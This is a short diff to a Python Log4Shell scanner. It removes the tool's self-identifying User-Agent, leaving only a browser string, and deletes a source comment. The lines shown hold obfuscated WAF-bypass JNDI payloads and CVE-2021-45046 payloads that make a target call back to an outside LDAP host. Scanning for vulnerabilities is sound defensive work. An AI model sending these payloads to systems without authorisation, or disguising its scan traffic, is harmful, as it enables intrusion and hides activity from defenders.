@@ -34,7 +34,6 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
@@ -68,7 +67,7 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        ]
 
 cve_2021_45046 = [
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",
                   "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                   "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                  ]
